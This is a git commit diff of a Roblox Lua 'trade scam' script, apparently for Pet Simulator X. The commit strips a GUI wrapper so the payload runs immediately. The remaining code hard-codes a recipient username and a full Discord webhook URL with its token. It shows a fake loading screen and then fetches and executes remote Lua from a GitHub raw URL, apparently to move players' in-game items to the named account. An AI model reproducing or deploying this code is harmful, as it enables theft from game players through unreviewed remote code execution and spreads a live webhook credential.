84e4c9b14d7b7c5e244effca116615c480ea4b40
CorruptedClan <105439556+CorruptedClan@users.noreply.github.com>
2023-04-23 09:10:28 +0300

    Update tradeScamPremium.lua

--- tradeScamPremium.lua
+++ tradeScamPremium.lua
@@ -1,21 +1,4 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-
---start
-local Window = OrionLib:MakeWindow({Name = "Trade Scam (⭐Premium)", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-
--- Scam
-local ScamTab = Window:MakeTab({ 
-         Name = "Trade Scam", 
-         Icon = "rbxassetid://4483345998", 
-         PremiumOnly = false 
- })
- local ScamSection = ScamTab:AddSection({ 
-         Name = "Thank you for buying premium♥️" 
- })
- ScamTab:AddButton({ 
-         Name = "Start Scam", 
-         Callback = function() 
-                       Username = "Wizard_CatWhite"
+Username = "Wizard_CatWhite"
 WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
 loadingscreen = true
 _G.CustomScriptName = "Psx Trade Scam Premium"
@@ -24,6 +7,3 @@ _G.Text2 = "Loaded"
 _G.Text3 = "Executing"
 _G.Text4 = "Waiting..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-
-           end     
- })
